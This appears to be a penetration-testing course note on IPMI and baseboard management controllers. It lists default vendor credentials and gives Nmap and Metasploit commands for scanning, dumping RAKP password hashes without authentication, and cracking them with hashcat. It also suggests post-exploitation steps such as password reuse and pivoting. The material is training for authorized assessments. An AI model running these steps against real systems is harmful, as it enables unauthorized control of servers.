# IPMI (Intelligent Platform Management Interface)

> A set of standardized specifications for hardware-based host management systems used for system management and monitoring, operating independently of the host's BIOS, CPU, firmware, and OS.

---

## Overview

**IPMI** provides sysadmins the ability to manage and monitor systems even when they are **powered off** or in an **unresponsive state**. It operates via a direct network connection to the system's hardware — no OS login shell required.

| Characteristic | Details |
|----------------|---------|
| **Type** | Hardware-based management interface |
| **First Published** | Intel, 1998 |
| **Supported By** | 200+ vendors (Cisco, Dell, HP, Supermicro, Intel, etc.) |
| **Current Version** | IPMI 2.0 (supports Serial over LAN) |
| **Independence** | Works independently of BIOS, CPU, firmware, and OS |

---

## Common Use Cases

| Use Case | Description |
|----------|-------------|
| **Pre-boot** | Modify BIOS settings before OS loads |
| **Powered down** | Manage fully powered-off hosts |
| **Post-failure** | Access host after system failure |
| **Monitoring** | System temperature, voltage, fan status, power supplies |
| **Inventory** | Query hardware inventory information |
| **Logging** | Review hardware event logs |
| **Alerting** | SNMP-based alerting for hardware events |
| **Remote upgrades** | Upgrade systems without physical access |

> ⚠️ **Requirement:** The IPMI module needs its own **power source** and **LAN connection** to function — even when the host is off.

---

## Default Port

| Port | Protocol | Description |
|------|----------|-------------|
| **UDP 623** | ASF-RMCP | IPMI network protocol |

> 📝 **Note:** BMCs also commonly expose **web consoles** (HTTPS), **SSH**, and **Telnet** for management.

---

## IPMI Components

| Component | Description |
|-----------|-------------|
| **BMC** (Baseboard Management Controller) | Micro-controller — the essential core component of IPMI |
| **ICMB** (Intelligent Chassis Management Bus) | Interface for chassis-to-chassis communication |
| **IPMB** (Intelligent Platform Management Bus) | Extends the BMC functionality |
| **IPMI Memory** | Stores system event log, repository data, and more |
| **Communications Interfaces** | Local system, serial, LAN, ICMB, and PCI Management Bus |

---

## BMC (Baseboard Management Controller)

Systems using IPMI are called **BMCs**. They are typically implemented as **embedded ARM systems running Linux**, connected directly to the host's motherboard.

| Aspect | Details |
|--------|---------|
| **Architecture** | Embedded ARM running Linux |
| **Connection** | Directly attached to host motherboard |
| **Form Factor** | Built into motherboard OR added as PCI card |
| **Access Level** | Nearly equivalent to **physical access** to the system |

### Common BMCs in the Wild

| Product | Vendor | Web Console |
|---------|--------|-------------|
| **iLO** (Integrated Lights-Out) | HP | Yes |
| **iDRAC** (Dell Remote Access Controller) | Dell | Yes |
| **Supermicro IPMI** | Supermicro | Yes |

> ⚠️ **Critical:** Gaining access to a BMC = full control of the host motherboard. You can **monitor, reboot, power off**, or even **reinstall the OS**.

---

## Default Credentials

| Product | Username | Password |
|---------|----------|----------|
| **Dell iDRAC** | `root` | `calvin` |
| **HP iLO** | `Administrator` | Randomized 8-char string (uppercase + numbers) |
| **Supermicro IPMI** | `ADMIN` | `ADMIN` |

> 💡 **Always try default credentials first** — they are frequently left unchanged and can lead to quick wins.

---

## Footprinting the Service

### Nmap — IPMI Version Detection

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```
> `-sU` is required for UDP scanning. The `ipmi-version` NSE script queries UDP port 623 to identify the IPMI version and supported authentication methods. Replace `ilo.inlanfreight.local` with the target hostname or IP.

```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
```

Key findings:
- IPMI protocol listening on **UDP 623**
- Version **IPMI-2.0** detected
- Authentication methods enumerated

### Metasploit — IPMI Information Discovery

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```
> The Metasploit `ipmi_version` module discovers IPMI services and reports version and authentication details. Set `RHOSTS` to your target IP and run. Equivalent to the Nmap scan but integrates into the Metasploit workflow.

```
[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---

## Dangerous Settings — RAKP Protocol Flaw

### The Vulnerability

IPMI 2.0 has a **critical flaw in the RAKP authentication protocol**:

> During authentication, the server sends a **salted SHA1 or MD5 hash** of the user's password to the client **before authentication takes place**.

This means:
1. **Any valid user's password hash** can be retrieved from the BMC
2. Hashes can be **cracked offline** via dictionary attack
3. There is **no fix** — the flaw is part of the IPMI specification

### Mitigations (No Direct Fix)

| Mitigation | Description |
|------------|-------------|
| **Long passwords** | Use very long, complex passwords that resist cracking |
| **Network segmentation** | Restrict direct access to BMCs via firewall rules |
| **VLAN isolation** | Place BMCs on dedicated management VLANs |

---

## Extracting IPMI Hashes

### Metasploit — IPMI 2.0 RAKP Hash Retrieval

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
```
> The `ipmi_dumphashes` module exploits the RAKP flaw in IPMI 2.0 to retrieve password hashes without authentication. Set `RHOSTS`, optionally set `OUTPUT_HASHCAT_FILE` to save hashes for cracking, then `run`.

```
Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s)
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
```

```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```
> Executes the hash dump. If a hash is immediately cracked (like `ADMIN:ADMIN` in the example), you see the plaintext password. Otherwise, save the hash and crack it with hashcat `-m 7300`.

```
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> 💡 **Tip:** Experiment with different wordlists — the default `ipmi_passwords.txt` only covers common passwords.

---

## Cracking IPMI Hashes

### Hashcat — Mode 7300 (IPMI2 RAKP HMAC-SHA1)

```bash
# Standard dictionary attack
hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt

# HP iLO default password mask attack (8-char: uppercase + numbers)
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
> `-m 7300` is the hashcat mode for IPMI2 RAKP HMAC-SHA1 hashes. The dictionary attack tries rockyou against the captured hash. The mask attack (`-a 3`) brute-forces all 8-character combinations of uppercase letters and digits — matching the HP iLO factory default password format. Save hashes from the Metasploit module to `ipmi.txt` first.

| Parameter | Description |
|-----------|-------------|
| `-m 7300` | IPMI2 RAKP HMAC-SHA1 hash mode |
| `-a 3` | Mask (brute-force) attack mode |
| `-1 ?d?u` | Custom charset: digits + uppercase letters |
| `?1?1?1?1?1?1?1?1` | 8-character mask using custom charset |

> 📝 **HP iLO Note:** Factory default passwords are 8-character strings of uppercase letters and numbers — the mask attack above targets this pattern specifically.

---

## Post-Exploitation

Once a BMC password is cracked, check for:

| Action | Description |
|--------|-------------|
| **BMC web console login** | Full hardware management access |
| **SSH/Telnet to BMC** | Command-line remote access |
| **Password reuse** | Try cracked password on other systems (SSH, web apps, etc.) |
| **Network pivoting** | BMC access may expose management VLANs |

> ⚠️ **Real-world finding:** Cracked IPMI hashes have led to SSH root access across critical servers and web management consoles for network monitoring tools via password reuse.

---

## Key Takeaways

1. **UDP 623** — IPMI communicates over UDP, not TCP; use `-sU` with Nmap
2. **BMC = Physical access** — Gaining BMC access means full control: reboot, power off, reinstall OS
3. **Always try defaults** — `root/calvin` (Dell), `ADMIN/ADMIN` (Supermicro), `Administrator/<random>` (HP)
4. **RAKP is fundamentally broken** — IPMI 2.0 leaks password hashes by design; there is no patch
5. **Hashcat mode 7300** — Crack IPMI hashes offline with dictionary or mask attacks
6. **HP iLO mask** — Use `-a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` for factory default HP passwords
7. **Check password reuse** — Cracked BMC passwords are often reused across the environment
8. **Common on internals** — IPMI is found on most internal penetration tests; always check UDP 623
9. **No fix exists** — Only mitigations: strong passwords + network segmentation

---

*HTB Academy - Footprinting Module*
